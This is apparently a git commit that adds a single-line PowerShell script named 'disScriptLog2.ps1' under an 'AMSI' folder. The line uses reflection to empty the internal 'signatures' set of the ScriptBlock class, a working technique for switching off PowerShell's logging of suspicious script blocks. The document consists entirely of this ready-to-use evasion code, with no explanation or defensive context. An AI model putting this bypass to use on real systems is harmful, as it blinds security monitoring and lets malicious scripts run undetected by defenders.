7306b28cc44bd31e2040e37ce3d33b4214082763
kyle <kyle41111@gmail.com>
2022-03-02 10:21:07 -0500

    Create disScriptLog2.ps1

---
+++ AMSI/disScriptLog2.ps1
@@ -0,0 +1,1 @@
+[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
